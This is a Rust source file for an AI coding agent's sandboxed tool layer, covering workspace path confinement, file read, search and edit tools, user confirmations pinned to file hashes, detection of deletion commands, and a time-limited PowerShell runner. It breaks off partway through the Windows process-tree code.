//! Workspace-restricted tools (PROTOCOL.md 3.3, 3.7, 3.8).
//!
//! Every path argument goes through [`Workspace::resolve`], which canonicalizes and rejects
//! anything outside the workspace root (including dangling symlinks/junctions). Mutating tools
//! ([`ToolKind::is_mutator`]) need UI confirmation before [`ToolRegistry::execute_with`] runs;
//! that gate lives in the agent loop. Approved edits carry the previewed file hash so a file
//! that changed between preview and execution is not overwritten.

use std::io::{BufRead, Read};
use std::path::{Path, PathBuf};
use std::time::Duration;

use serde_json::{json, Value};
use sha2::Digest as _;
use tokio::io::AsyncReadExt;
use tokio_util::sync::CancellationToken;

use crate::api::FunctionDeclaration;

/// Default `read_file` window and per-line cut (PROTOCOL 3.3).
pub const READ_DEFAULT_LINES: usize = 2000;
pub const READ_MAX_LINE_CHARS: usize = 2000;
/// Largest file `read_file` opens at all.
pub const READ_MAX_FILE_BYTES: u64 = 20 * 1024 * 1024;
/// Largest file `write_file` / `replace` previews and edits.
pub const EDIT_MAX_FILE_BYTES: u64 = 20 * 1024 * 1024;
/// Files above this size are skipped by `grep_search`.
pub const SEARCH_MAX_FILE_BYTES: u64 = 4 * 1024 * 1024;
/// Hard cap on `grep_search` / `glob` results.
pub const SEARCH_MAX_MATCHES: usize = 500;
/// Default `total_max_matches` for `grep_search`.
pub const SEARCH_DEFAULT_MATCHES: usize = 100;
/// Cap on the text any tool returns to the model.
pub const TOOL_OUTPUT_MAX_BYTES: usize = 256 * 1024;
/// Inputs larger than this are not diffed line by line in confirmations.
pub const DIFF_MAX_INPUT_BYTES: usize = 2 * 1024 * 1024;
/// Cap on the diff text shown in a confirmation.
pub const DIFF_MAX_BYTES: usize = 256 * 1024;
/// How long to wait for output pipes after the shell exits before ending its process tree.
const SHELL_DRAIN_GRACE: Duration = Duration::from_secs(2);

/// Tool kinds (subset of PROTOCOL 3.7).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ToolKind {
    Read,
    Search,
    Edit,
    Execute,
}

impl ToolKind {
    /// Mutators require confirmation in the default approval mode.
    pub fn is_mutator(self) -> bool {
        matches!(self, ToolKind::Edit | ToolKind::Execute)
    }
}

/// Tool error codes surfaced to the model as `response.error` (PROTOCOL 3.3 `replace`).
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
pub enum ToolError {
    #[error("path is outside the workspace: {0}")]
    OutsideWorkspace(String),
    #[error("FILE_NOT_FOUND: {0}")]
    FileNotFound(String),
    #[error("EDIT_NO_OCCURRENCE_FOUND: old_string was not found in {0}")]
    NoOccurrence(String),
    #[error("EDIT_EXPECTED_OCCURRENCE_MISMATCH: Expected 1 occurrence but found {0}; set 'allow_multiple' to true to replace all")]
    OccurrenceMismatch(usize),
    #[error("EDIT_NO_CHANGE: old_string and new_string are identical")]
    NoChange,
    #[error("ATTEMPT_TO_CREATE_EXISTING_FILE: {0} already exists")]
    CreateExisting(String),
    #[error("FILE_WRITE_FAILURE: {0}")]
    WriteFailure(String),
    #[error("FILE_TOO_LARGE: {path} is {size} bytes (limit {limit})")]
    TooLarge { path: String, size: u64, limit: u64 },
    #[error("invalid arguments: {0}")]
    InvalidArgs(String),
    #[error("unknown tool: {0}")]
    UnknownTool(String),
    #[error("{0}")]
    Io(String),
    #[error("command timed out after {0:?}")]
    Timeout(Duration),
    #[error("the operation was cancelled")]
    Cancelled,
}

impl From<std::io::Error> for ToolError {
    fn from(e: std::io::Error) -> Self {
        ToolError::Io(e.to_string())
    }
}

/// The workspace root that bounds every tool.
#[derive(Debug, Clone)]
pub struct Workspace {
    root: PathBuf,
}

impl Workspace {
    /// Canonicalize `root` (strips `\\?\` via `dunce`). Fails if it does not exist.
    pub fn new(root: &Path) -> std::io::Result<Self> {
        Ok(Self { root: dunce::canonicalize(root)? })
    }

    pub fn root(&self) -> &Path {
        &self.root
    }

    /// Resolve `p` (relative to the root, or absolute) and require it to lie inside the root.
    ///
    /// Existing paths are canonicalized (following symlinks). For a not-yet-existing path the
    /// nearest existing ancestor is canonicalized and the remaining components are appended;
    /// `..` in the remainder is rejected, and so is any remaining component that exists as a
    /// (dangling) symlink or junction, because writing through it would follow the link.
    pub fn resolve(&self, p: &str) -> Result<PathBuf, ToolError> {
        let raw = Path::new(p);
        let joined = if raw.is_absolute() { raw.to_path_buf() } else { self.root.join(raw) };
        let resolved = if joined.exists() {
            dunce::canonicalize(&joined)?
        } else {
            let mut existing = joined.as_path();
            let mut tail = Vec::new();
            while !existing.exists() {
                if std::fs::symlink_metadata(existing).is_ok() {
                    // exists() is false but the entry is there: a dangling link or junction.
                    return Err(ToolError::OutsideWorkspace(p.into()));
                }
                tail.push(existing.file_name().ok_or_else(|| ToolError::OutsideWorkspace(p.into()))?.to_owned());
                existing = existing.parent().ok_or_else(|| ToolError::OutsideWorkspace(p.into()))?;
            }
            let mut base = dunce::canonicalize(existing)?;
            for c in tail.iter().rev() {
                if c == ".." || c == "." {
                    return Err(ToolError::OutsideWorkspace(p.into()));
                }
                if is_reserved_device_name(&c.to_string_lossy()) {
                    return Err(ToolError::OutsideWorkspace(p.into()));
                }
                base.push(c);
            }
            base
        };
        if resolved.starts_with(&self.root) {
            Ok(resolved)
        } else {
            Err(ToolError::OutsideWorkspace(p.into()))
        }
    }

    /// Path relative to the root for display.
    pub fn display(&self, p: &Path) -> String {
        p.strip_prefix(&self.root).unwrap_or(p).display().to_string()
    }
}

/// Windows device names that cannot be used as file names: `CON`, `PRN`, `AUX`, `NUL`,
/// `COM1`..`COM9` (and superscript variants), `LPT1`..`LPT9`. A path component equal to one of
/// these (ignoring case and a trailing extension) addresses a device, not a workspace file —
/// `NUL` swallows writes, `CON` reads the console — so [`Workspace::resolve`] refuses it.
pub fn is_reserved_device_name(component: &str) -> bool {
    let stem = match component.split_once('.') {
        Some((stem, _)) => stem,
        None => component,
    };
    let base = stem.trim_end_matches([' ', '.']).to_ascii_lowercase();
    if matches!(base.as_str(), "con" | "prn" | "aux" | "nul" | "clock$") {
        return true;
    }
    // COM1..COM9 / LPT1..LPT9, including the superscript digits Windows also reserves
    // (which are multi-byte in UTF-8; compare the suffix as a &str rather than by char index).
    let superscript: &[&str] = &["\u{b9}", "\u{b2}", "\u{b3}"];
    for prefix in ["com", "lpt"] {
        if let Some(digit) = base.strip_prefix(prefix) {
            if matches!(digit, "1"|"2"|"3"|"4"|"5"|"6"|"7"|"8"|"9") || superscript.contains(&digit) {
                return true;
            }
        }
    }
    false
}

/// What the UI shows when asking to approve a call.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ConfirmationDetails {
    /// `write_file` / `replace`: unified diff of the change. `resolved` and `old_hash` pin the
    /// approval to the exact file content that was previewed.
    Edit { path: String, diff: String, is_new_file: bool, resolved: PathBuf, old_hash: Option<[u8; 32]> },
    /// `write_file` where the new content is empty: the file is erased. The user must confirm
    /// explicitly; this variant is never covered by session approvals or the terminal policy.
    /// `old_hash` pins the approval to the content the user was shown, so a file that changed in
    /// between is refused instead of erased unseen.
    Delete { path: String, old_hash: Option<[u8; 32]> },
    /// `run_shell_command`. `simple` is false for compound commands (pipes, `;`, subexpressions,
    /// redirections, ...), which can never be session-approved.
    Shell { command: String, dir: String, root_command: String, description: Option<String>, simple: bool },
    /// Read/search tools when auto-approve for read tools is off.
    Read { summary: String },
    /// An MCP server tool. It runs in another process, outside the workspace, so it always
    /// asks and is never covered by --dangerously-skip-permissions.
    Mcp { server: String, tool: String, summary: String, read_only: bool },
}

/// How an AI-initiated deletion would happen (shown in the warning dialog).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum DeleteHow {
    /// `write_file` with empty content (file is emptied / effectively deleted).
    WriteEmpty,
    /// Shell command that contains a file-deletion verb.
    Shell,
}

/// Verbs that remove files or directories, so a line using one always asks for approval.
///
/// Both shells' spellings are listed (`rm`/`del`/`erase`/`rmdir`/`Remove-Item` and their
/// PowerShell aliases), plus `git rm`, which deletes tracked files. Matching is on the first
/// token of each part, so ordinary words in arguments cannot trigger it.
const DELETE_VERBS: &[&str] = &[
    "rm", "del", "erase", "rmdir", "rd", "unlink", "remove-item", "ri", "rmtree", "rimraf", "sdelete",
];

/// True when any part of `command` starts with a file-deletion verb.
///
/// This is what makes "the AI wants to delete a file" visible regardless of the terminal
/// policy: [`crate::agent::policy::ApprovalPolicy`] asks on it, and [`root_command`] refuses
/// to give it a session key.
pub fn deletes_files(command: &str) -> bool {
    command_parts(command).unwrap_or_else(|| command_fragments(command)).iter().any(|part| {
        let head = part.split_whitespace().next().unwrap_or("").trim_matches(['"', '\'']).trim_start_matches('&');
        let head = [".exe", ".cmd", ".bat", ".com"].iter().find_map(|e| head.to_lowercase().strip_suffix(e).map(str::to_owned)).unwrap_or_else(|| head.to_lowercase());
        // `git rm x` deletes too.
        DELETE_VERBS.contains(&head.as_str()) || (head == "git" && part.split_whitespace().nth(1).is_some_and(|w| w == "rm" || w == "clean"))
    })
}

/// Output of a successful tool run, sent back as `{"output": text}`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ToolOutput {
    /// Text for the model.
    pub llm_content: String,
    /// Short text for the tool card in the UI.
    pub display: String,
}

/// Runtime limits for tools.
#[derive(Debug, Clone, Copy)]
pub struct ToolLimits {
    pub shell_timeout: Duration,
    pub shell_output_cap: usize,
}

impl Default for ToolLimits {
    fn default() -> Self {
        Self { shell_timeout: Duration::from_secs(120), shell_output_cap: 64 * 1024 }
    }
}

/// Built-in tool names.
pub const LIST_DIRECTORY: &str = "list_directory";
pub const READ_FILE: &str = "read_file";
pub const GLOB: &str = "glob";
pub const GREP_SEARCH: &str = "grep_search";
/// Older name of [`GREP_SEARCH`], still accepted when the model calls it.
pub const SEARCH_FILE_CONTENT: &str = "search_file_content";
pub const WRITE_FILE: &str = "write_file";
pub const REPLACE: &str = "replace";
pub const RUN_SHELL_COMMAND: &str = "run_shell_command";

/// The fixed tool set bound to a workspace.
#[derive(Debug, Clone)]
pub struct ToolRegistry {
    ws: Workspace,
    limits: ToolLimits,
}

impl ToolRegistry {
    pub fn new(ws: Workspace, limits: ToolLimits) -> Self {
        Self { ws, limits }
    }

    pub fn workspace(&self) -> &Workspace {
        &self.ws
    }

    /// Kind of a tool, or `None` if unknown.
    pub fn kind(&self, name: &str) -> Option<ToolKind> {
        Some(match name {
            READ_FILE => ToolKind::Read,
            LIST_DIRECTORY | GLOB | GREP_SEARCH | SEARCH_FILE_CONTENT => ToolKind::Search,
            WRITE_FILE | REPLACE => ToolKind::Edit,
            RUN_SHELL_COMMAND => ToolKind::Execute,
            _ => return None,
        })
    }

    /// Declarations sent as `tools[0].functionDeclarations`.
    pub fn declarations(&self) -> Vec<FunctionDeclaration> {
        fn decl(name: &str, description: &str, schema: Value) -> FunctionDeclaration {
            FunctionDeclaration { name: name.into(), description: description.into(), parameters_json_schema: schema }
        }
        vec![
            decl(LIST_DIRECTORY, "Lists the entries of a directory inside the workspace.", json!({
                "type":"object","properties":{"dir_path":{"type":"string","description":"Directory path, absolute or relative to the workspace root."}},
                "required":["dir_path"]})),
            decl(READ_FILE, "Reads a text file. Use start_line/end_line for large files.", json!({
                "type":"object","properties":{
                    "file_path":{"type":"string","description":"Path to the file."},
                    "start_line":{"type":"integer","description":"1-based start line."},
                    "end_line":{"type":"integer","description":"1-based inclusive end line."}},
                "required":["file_path"]})),
            decl(GLOB, "Finds files whose workspace-relative path matches a glob pattern.", json!({
                "type":"object","properties":{
                    "pattern":{"type":"string","description":"Glob such as src/**/*.rs."},
                    "dir_path":{"type":"string","description":"Directory to search, defaults to the workspace root."}},
                "required":["pattern"]})),
            decl(GREP_SEARCH, "Searches file contents for a regular expression. Returns path:line: text for each match.", json!({
                "type":"object","properties":{
                    "pattern":{"type":"string","description":"Regular expression (Rust regex syntax)."},
                    "dir_path":{"type":"string","description":"Directory to search, defaults to the workspace root."},
                    "include_pattern":{"type":"string","description":"Optional glob restricting which files are searched, e.g. **/*.rs."},
                    "exclude_pattern":{"type":"string","description":"Optional regular expression; matching lines are left out."},
                    "names_only":{"type":"boolean","description":"Return only the paths of files that match."},
                    "max_matches_per_file":{"type":"integer","minimum":1,"description":"Maximum matches returned per file."},
                    "total_max_matches":{"type":"integer","minimum":1,"description":"Maximum matches returned in total (default 100)."}},
                "required":["pattern"]})),
            decl(WRITE_FILE, "Creates or overwrites a file with the given full content.", json!({
                "type":"object","properties":{
                    "file_path":{"type":"string","description":"Path to the file."},
                    "content":{"type":"string","description":"Full new file content."}},
                "required":["file_path","content"]})),
            decl(REPLACE, "Replaces an exact string in a file. old_string must match exactly once unless allow_multiple is true. Empty old_string on a missing file creates it.", json!({
                "type":"object","properties":{
                    "file_path":{"type":"string","description":"Path to the file."},
                    "instruction":{"type":"string","description":"One sentence describing the change."},
                    "old_string":{"type":"string","description":"Exact text to replace, with surrounding context."},
                    "new_string":{"type":"string","description":"Replacement text."},
                    "allow_multiple":{"type":"boolean","description":"Replace every occurrence."}},
                "required":["file_path","instruction","old_string","new_string"]})),
            decl(RUN_SHELL_COMMAND, "Runs a PowerShell command in the workspace and returns its output and exit code.", json!({
                "type":"object","properties":{
                    "command":{"type":"string","description":"PowerShell command line."},
                    "description":{"type":"string","description":"One line explaining the command to the user."},
                    "dir_path":{"type":"string","description":"Working directory inside the workspace."}},
                "required":["command"]})),
        ]
    }

    /// Build the confirmation shown before a call (every known tool has one).
    pub fn confirmation(&self, name: &str, args: &Value) -> Result<ConfirmationDetails, ToolError> {
        match name {
            WRITE_FILE => {
                let path = self.ws.resolve(str_arg(args, "file_path")?)?;
                let d = self.ws.display(&path);
                let old = read_text_limited(&path, &d, EDIT_MAX_FILE_BYTES)?;
                let new = str_arg(args, "content")?;
                // An empty write on an existing file is effectively a deletion: the model almost
                // never intentionally empties a file. Show a dedicated warning so the user cannot
                // miss it, and ensure it can never be session-approved.
                if new.trim().is_empty() && old.is_some() {
                    return Ok(ConfirmationDetails::Delete { path: d, old_hash: old.as_deref().map(hash_text) });
                }
                Ok(ConfirmationDetails::Edit {
                    diff: unified_diff(&d, old.as_deref().unwrap_or(""), new),
                    is_new_file: old.is_none(),
                    old_hash: old.as_deref().map(hash_text),
                    path: d,
                    resolved: path,
                })
            }
            REPLACE => {
                let path = self.ws.resolve(str_arg(args, "file_path")?)?;
                let d = self.ws.display(&path);
                let old = read_text_limited(&path, &d, EDIT_MAX_FILE_BYTES)?;
                let new = apply_replace(
                    old.as_deref(),
                    str_arg(args, "old_string")?,
                    str_arg(args, "new_string")?,
                    args.get("allow_multiple").and_then(Value::as_bool).unwrap_or(false),
                    &d,
                )?;
                Ok(ConfirmationDetails::Edit {
                    diff: unified_diff(&d, old.as_deref().unwrap_or(""), &new),
                    is_new_file: old.is_none(),
                    old_hash: old.as_deref().map(hash_text),
                    path: d,
                    resolved: path,
                })
            }
            RUN_SHELL_COMMAND => {
                let command = str_arg(args, "command")?.to_owned();
                let dir = self.dir_arg(args)?;
                Ok(ConfirmationDetails::Shell {
                    root_command: root_command(&command),
                    simple: is_simple_command(&command),
                    command,
                    dir: dir.display().to_string(),
                    description: args.get("description").and_then(Value::as_str).map(str::to_owned),
                })
            }
            READ_FILE => {
                let path = self.ws.resolve(str_arg(args, "file_path")?)?;
                Ok(ConfirmationDetails::Read { summary: format!("Read file {}", self.ws.display(&path)) })
            }
            LIST_DIRECTORY => {
                let dir = self.ws.resolve(str_arg(args, "dir_path")?)?;
                Ok(ConfirmationDetails::Read { summary: format!("List directory {}", self.display_dir(&dir)) })
            }
            GLOB => {
                let dir = self.dir_arg(args)?;
                Ok(ConfirmationDetails::Read {
                    summary: format!("Find files matching '{}' in {}", str_arg(args, "pattern")?, self.display_dir(&dir)),
                })
            }
            GREP_SEARCH | SEARCH_FILE_CONTENT => {
                let dir = self.dir_arg(args)?;
                Ok(ConfirmationDetails::Read {
                    summary: format!("Search file contents for /{}/ in {}", str_arg(args, "pattern")?, self.display_dir(&dir)),
                })
            }
            other => Err(ToolError::UnknownTool(other.into())),
        }
    }

    /// Execute a tool without an approval record or cancellation (tests and read tools).
    pub async fn execute(&self, name: &str, args: &Value) -> Result<ToolOutput, ToolError> {
        self.execute_with(name, args, None, &CancellationToken::new()).await
    }

    /// Execute a tool. Callers must have obtained confirmation for mutators and pass the
    /// approved details, so edits can be checked against what the user saw.
    ///
    /// File tools run on the blocking pool and poll `cancel`; the shell tool kills its whole
    /// process tree when the future is dropped or times out.
    pub async fn execute_with(
        &self,
        name: &str,
        args: &Value,
        approved: Option<&ConfirmationDetails>,
        cancel: &CancellationToken,
    ) -> Result<ToolOutput, ToolError> {
        if name == RUN_SHELL_COMMAND {
            return self.run_shell(args).await;
        }
        if self.kind(name).is_none() {
            return Err(ToolError::UnknownTool(name.into()));
        }
        let this = self.clone();
        let (name, args, approved, cancel) = (name.to_owned(), args.clone(), approved.cloned(), cancel.clone());
        tokio::task::spawn_blocking(move || this.execute_blocking(&name, &args, approved.as_ref(), &cancel))
            .await
            .map_err(|e| ToolError::Io(format!("tool task failed: {e}")))?
    }

    fn execute_blocking(
        &self,
        name: &str,
        args: &Value,
        approved: Option<&ConfirmationDetails>,
        cancel: &CancellationToken,
    ) -> Result<ToolOutput, ToolError> {
        match name {
            LIST_DIRECTORY => self.list_directory(args),
            READ_FILE => self.read_file(args),
            GLOB => self.glob(args, cancel),
            GREP_SEARCH | SEARCH_FILE_CONTENT => self.search(args, cancel),
            WRITE_FILE => self.write_file(args, approved),
            REPLACE => self.replace(args, approved),
            other => Err(ToolError::UnknownTool(other.into())),
        }
    }

    fn dir_arg(&self, args: &Value) -> Result<PathBuf, ToolError> {
        match args.get("dir_path").and_then(Value::as_str) {
            Some(d) => self.ws.resolve(d),
            None => Ok(self.ws.root().to_path_buf()),
        }
    }

    fn display_dir(&self, p: &Path) -> String {
        let d = self.ws.display(p);
        if d.is_empty() { "the workspace root".into() } else { d }
    }

    fn list_directory(&self, args: &Value) -> Result<ToolOutput, ToolError> {
        let dir = self.ws.resolve(str_arg(args, "dir_path")?)?;
        let mut entries: Vec<String> = std::fs::read_dir(&dir)?
            .flatten()
            .map(|e| {
                let n = e.file_name().to_string_lossy().into_owned();
                if e.path().is_dir() { format!("[DIR] {n}") } else { n }
            })
            .collect();
        entries.sort();
        let display = format!("{} entries", entries.len());
        Ok(ToolOutput { display, llm_content: cap_output(entries.join("\n")) })
    }

    fn read_file(&self, args: &Value) -> Result<ToolOutput, ToolError> {
        let path = self.ws.resolve(str_arg(args, "file_path")?)?;
        let d = self.ws.display(&path);
        let meta = std::fs::metadata(&path).map_err(|_| ToolError::FileNotFound(d.clone()))?;
        if !meta.is_file() {
            return Err(ToolError::FileNotFound(d));
        }
        if meta.len() > READ_MAX_FILE_BYTES {
            return Err(ToolError::TooLarge { path: d, size: meta.len(), limit: READ_MAX_FILE_BYTES });
        }
        let file = std::fs::File::open(&path).map_err(|_| ToolError::FileNotFound(d.clone()))?;
        let mut reader = std::io::BufReader::new(file);
        if looks_binary(reader.fill_buf()?) {
            return Err(ToolError::InvalidArgs(format!("{d} looks like a binary file")));
        }
        let start = args.get("start_line").and_then(Value::as_u64).unwrap_or(1).max(1) as usize;
        let want_end = args
            .get("end_line")
            .and_then(Value::as_u64)
            .map(|e| e as usize)
            .unwrap_or(start + READ_DEFAULT_LINES - 1);
        let mut shown: Vec<String> = Vec::new();
        let mut bytes = 0usize;
        let mut truncated = false;
        let mut total = 0usize;
        let mut line = Vec::new();
        loop {
            line.clear();
            if reader.read_until(b'\n', &mut line)? == 0 {
                break;
            }
            total += 1;
            if total < start || total > want_end || truncated {
                continue;
            }
            while matches!(line.last(), Some(b'\n' | b'\r')) {
                line.pop();
            }
            let text = cut_line(&String::from_utf8_lossy(&line));
            if bytes + text.len() + 1 > TOOL_OUTPUT_MAX_BYTES {
                truncated = true;
                continue;
            }
            bytes += text.len() + 1;
            shown.push(text);
        }
        let end = if shown.is_empty() { start.saturating_sub(1) } else { start + shown.len() - 1 };
        let mut out = String::new();
        if start > 1 || end < total {
            out.push_str(&format!("[Showing lines {start}-{end} of {total}]\n"));
        }
        out.push_str(&shown.join("\n"));
        if truncated {
            out.push_str("\n[output truncated; request a smaller line range]");
        }
        Ok(ToolOutput { display: format!("{} lines", shown.len()), llm_content: out })
    }

    fn glob(&self, args: &Value, cancel: &CancellationToken) -> Result<ToolOutput, ToolError> {
        let base = self.dir_arg(args)?;
        let matcher = globset::Glob::new(str_arg(args, "pattern")?)
            .map_err(|e| ToolError::InvalidArgs(e.to_string()))?
            .compile_matcher();
        let mut hits = Vec::new();
        for p in walk_files(&base) {
            if cancel.is_cancelled() {
                return Err(ToolError::Cancelled);
            }
            if p.strip_prefix(&base).is_ok_and(|r| matcher.is_match(r)) {
                hits.push(p.display().to_string());
                if hits.len() >= SEARCH_MAX_MATCHES {
                    break;
                }
            }
        }
        Ok(ToolOutput { display: format!("{} files", hits.len()), llm_content: cap_output(hits.join("\n")) })
    }

    fn search(&self, args: &Value, cancel: &CancellationToken) -> Result<ToolOutput, ToolError> {
        let base = self.dir_arg(args)?;
        let re = regex::Regex::new(str_arg(args, "pattern")?).map_err(|e| ToolError::InvalidArgs(e.to_string()))?;
        let include = match args.get("include_pattern").and_then(Value::as_str) {
            Some(g) => Some(globset::Glob::new(g).map_err(|e| ToolError::InvalidArgs(e.to_string()))?.compile_matcher()),
            None => None,
        };
        let exclude = match args.get("exclude_pattern").and_then(Value::as_str).filter(|s| !s.is_empty()) {
            Some(x) => Some(regex::Regex::new(x).map_err(|e| ToolError::InvalidArgs(e.to_string()))?),
            None => None,
        };
        let names_only = args.get("names_only").and_then(Value::as_bool).unwrap_or(false);
        let per_file = args.get("max_matches_per_file").and_then(Value::as_u64).map(|n| n.max(1) as usize).unwrap_or(usize::MAX);
        let total_max = args
            .get("total_max_matches")
            .and_then(Value::as_u64)
            .map(|n| n.max(1) as usize)
            .unwrap_or(SEARCH_DEFAULT_MATCHES)
            .min(SEARCH_MAX_MATCHES);
        let mut out = Vec::new();
        let mut matches = 0usize;
        let mut bytes = 0usize;
        let mut truncated = false;
        'files: for p in walk_files(&base) {
            if cancel.is_cancelled() {
                return Err(ToolError::Cancelled);
            }
            if let Some(m) = &include {
                if !p.strip_prefix(&base).is_ok_and(|r| m.is_match(r)) {
                    continue;
                }
            }
            if std::fs::metadata(&p).map(|m| m.len() > SEARCH_MAX_FILE_BYTES).unwrap_or(true) {
                continue;
            }
            let Ok(raw) = std::fs::read(&p) else { continue };
            if looks_binary(&raw) {
                continue;
            }
            let text = String::from_utf8_lossy(&raw);
            let mut in_file = 0usize;
            for (i, line) in text.lines().enumerate() {
                if !re.is_match(line) || exclude.as_ref().is_some_and(|x| x.is_match(line)) {
                    continue;
                }
                in_file += 1;
                matches += 1;
                let entry = if names_only {
                    self.ws.display(&p)
                } else {
                    format!("{}:{}: {}", self.ws.display(&p), i + 1, cut_line(line.trim_end()))
                };
                if bytes + entry.len() + 1 > TOOL_OUTPUT_MAX_BYTES {
                    truncated = true;
                    break 'files;
                }
                bytes += entry.len() + 1;
                out.push(entry);
                if matches >= total_max {
                    break 'files;
                }
                if names_only || in_file >= per_file {
                    break;
                }
            }
        }
        let mut llm = out.join("\n");
        if truncated {
            llm.push_str("\n[output truncated]");
        }
        let display = if names_only { format!("{} files", out.len()) } else { format!("{} matches", out.len()) };
        Ok(ToolOutput { display, llm_content: llm })
    }

    /// Refuse an edit or a deletion whose target moved or changed since the user approved the
    /// preview. Both carry `old_hash`, so a deletion the user approved against one version is
    /// refused when the file has changed since — nothing is erased unseen.
    fn check_approved(&self, path: &Path, display: &str, approved: Option<&ConfirmationDetails>) -> Result<(), ToolError> {
        let pinned = match approved {
            Some(ConfirmationDetails::Edit { resolved, old_hash, .. }) => Some((resolved, old_hash)),
            Some(ConfirmationDetails::Delete { old_hash, .. }) => Some((&path.to_path_buf(), old_hash)),
            _ => None,
        };
        if let Some((resolved, old_hash)) = pinned {
            if resolved != path {
                return Err(ToolError::WriteFailure(format!("{display} resolved to a different path than the one approved")));
            }
            let now = read_text_limited(path, display, EDIT_MAX_FILE_BYTES)?.as_deref().map(hash_text);
            if now != *old_hash {
                return Err(ToolError::WriteFailure(format!("{display} changed after it was approved; read it again and retry")));
            }
        }
        Ok(())
    }

    fn write_file(&self, args: &Value, approved: Option<&ConfirmationDetails>) -> Result<ToolOutput, ToolError> {
        let path = self.ws.resolve(str_arg(args, "file_path")?)?;
        let d = self.ws.display(&path);
        let content = str_arg(args, "content")?;
        self.check_approved(&path, &d, approved)?;
        crate::store::atomic_write(&path, content.as_bytes()).map_err(|e| ToolError::WriteFailure(e.to_string()))?;
        Ok(ToolOutput { llm_content: format!("Wrote {} bytes to {d}", content.len()), display: format!("wrote {d}") })
    }

    fn replace(&self, args: &Value, approved: Option<&ConfirmationDetails>) -> Result<ToolOutput, ToolError> {
        let path = self.ws.resolve(str_arg(args, "file_path")?)?;
        let d = self.ws.display(&path);
        self.check_approved(&path, &d, approved)?;
        let old = read_text_limited(&path, &d, EDIT_MAX_FILE_BYTES)?;
        let new = apply_replace(
            old.as_deref(),
            str_arg(args, "old_string")?,
            str_arg(args, "new_string")?,
            args.get("allow_multiple").and_then(Value::as_bool).unwrap_or(false),
            &d,
        )?;
        crate::store::atomic_write(&path, new.as_bytes()).map_err(|e| ToolError::WriteFailure(e.to_string()))?;
        Ok(ToolOutput { llm_content: format!("Successfully modified {d}"), display: format!("edited {d}") })
    }

    async fn run_shell(&self, args: &Value) -> Result<ToolOutput, ToolError> {
        let command = str_arg(args, "command")?;
        let dir = self.dir_arg(args)?;
        let mut cmd = shell_command(command);
        cmd.current_dir(&dir)
            .kill_on_drop(true)
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped());
        let mut child = cmd.spawn()?;
        // Dropping the guard (cancel) or calling kill() (timeout) ends the whole process tree.
        let tree = proc_tree::TreeGuard::attach(&child);
        let cap = self.limits.shell_output_cap;
        let out = child.stdout.take().map(|s| tokio::spawn(read_capped(s, cap)));
        let err = child.stderr.take().map(|s| tokio::spawn(read_capped(s, cap)));
        let status = match tokio::time::timeout(self.limits.shell_timeout, child.wait()).await {
            Ok(s) => s?,
            Err(_) => {
                if let Some(t) = &tree {
                    t.kill();
                }
                let _ = child.start_kill();
                return Err(ToolError::Timeout(self.limits.shell_timeout));
            }
        };
        // Background grandchildren may keep the pipes open; give them a moment, then end the tree.
        let collect = async { (join_reader(out).await, join_reader(err).await) };
        tokio::pin!(collect);
        let ((o, o_total), (e, e_total)) = match tokio::time::timeout(SHELL_DRAIN_GRACE, &mut collect).await {
            Ok(v) => v,
            Err(_) => {
                if let Some(t) = &tree {
                    t.kill();
                }
                collect.await
            }
        };
        drop(tree);
        let mut bytes = o;
        bytes.extend_from_slice(&e);
        let total = o_total + e_total;
        let truncated = total > cap as u64 || bytes.len() > cap;
        bytes.truncate(cap);
        let mut combined = String::from_utf8_lossy(&bytes).into_owned();
        if truncated {
            combined.push_str(&format!("\n[output truncated: {total} bytes total]"));
        }
        let code = status.code().map(|c| c.to_string()).unwrap_or_else(|| "(none)".into());
        let llm = format!(
            "Command: {command}\nDirectory: {}\nOutput: {}\nError: (none)\nExit Code: {code}",
            dir.display(),
            if combined.is_empty() { "(empty)" } else { &combined }
        );
        Ok(ToolOutput { llm_content: llm, display: format!("exit {code}") })
    }
}

/// Read a pipe to EOF, keeping at most `cap` bytes; returns (kept bytes, total bytes seen).
async fn read_capped<R: tokio::io::AsyncRead + Unpin>(mut r: R, cap: usize) -> (Vec<u8>, u64) {
    let mut buf = Vec::new();
    let mut total = 0u64;
    let mut chunk = [0u8; 8192];
    loop {
        match r.read(&mut chunk).await {
            Ok(0) | Err(_) => break,
            Ok(n) => {
                total += n as u64;
                let room = cap.saturating_sub(buf.len());
                buf.extend_from_slice(&chunk[..n.min(room)]);
            }
        }
    }
    (buf, total)
}

async fn join_reader(h: Option<tokio::task::JoinHandle<(Vec<u8>, u64)>>) -> (Vec<u8>, u64) {
    match h {
        Some(h) => h.await.unwrap_or_default(),
        None => (Vec::new(), 0),
    }
}

/// Process-tree lifetime for shell commands and hook commands: a Job Object with
/// KILL_ON_JOB_CLOSE on Windows, a process group on unix.
#[cfg(windows)]
pub(crate) mod proc_tree {
    use windows_sys::Win32::Foundation::{CloseHandle, HANDLE};
    use windows_sys::Win32::System::JobObjects::{
        AssignProcessToJobObject, CreateJobObjectW, JobObjectExtendedLimitInformation, SetInformationJobObject,
        TerminateJobObject, JOBOBJECT_EXTENDED_LIMIT_INFORMATION, JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE,
    };

    pub struct TreeGuard(HANDLE);
    // SAFETY: a job handle is a kernel object handle usable from any thread.
    unsafe impl Send for TreeGuard {}
    unsafe impl Sync for TreeGuard {}

    impl TreeGuard {
        pub fn attach(child: &tokio::process::Child) -> Option<Self> {
            Self::attach_raw(child.raw_handle()?)
        }

        /// [`Self::attach`] for a `std::process::Child` (hook commands run on a blocking thread).
        pub fn attach_std(child: &std::process::Child) -> Option<Self> {
            use std::os::windows::io::AsRawHandle;
            Self::attach_raw(child.as_raw_handle())
        }

        fn attach_raw(raw: std::os::windows::io::RawHandle) -> Option<Self> {
            // SAFETY: plain Win32 calls on handles we own; failures close the job and return None.
            unsafe {
                let job = CreateJobObjectW(std::ptr::null(), std::ptr::null());
                if job.is_null() {
                    return None;
                }
                let mut info: JOBOBJECT_EXTENDED_LIMIT_INFORMATION = std::mem::zeroed();
                info.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
                let ok = SetInformationJobObject(
                    job,
                    JobObjectExtendedLimitInformation,
                    &info as *const _ as *const core::ffi::c_void,
